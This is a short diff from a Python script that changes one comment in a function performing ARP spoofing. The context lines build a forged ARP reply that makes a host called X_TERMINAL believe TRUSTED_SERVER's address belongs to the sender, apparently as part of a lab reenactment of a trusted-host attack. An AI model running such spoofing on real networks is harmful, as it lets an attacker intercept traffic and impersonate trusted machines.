@@ -46,7 +46,7 @@ def prep_env():
     sleep(2)
 
 
-# Spoofing function -> Keep the arp spoofing updated while running the script
+# Spoofing x-terminal -> Keep the arp spoofing updated while running the script
 def spoof():
     arp_terminal = ARP(op=2, pdst=X_TERMINAL, hwdst=get_mac(X_TERMINAL), psrc=TRUSTED_SERVER)
 
